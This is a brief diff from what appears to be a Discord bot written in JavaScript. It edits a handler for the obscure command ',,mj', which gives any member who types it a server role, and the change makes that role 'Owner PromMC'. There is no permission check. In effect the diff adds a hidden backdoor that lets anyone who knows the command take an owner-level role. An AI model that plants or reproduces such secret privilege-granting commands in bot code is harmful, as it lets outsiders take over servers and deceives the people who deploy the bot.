@@ -353,7 +353,7 @@ message.author.send("** [❖═════1play═══════❖]**" + `
 client.on('message', message => {
   if (message.content.startsWith(',,mj')) {
      if(!message.channel.guild) return;
-  message.member.addRole(message.guild.roles.find("name", "."));
+  message.member.addRole(message.guild.roles.find("name", "Owner PromMC"));
  
  }
  });
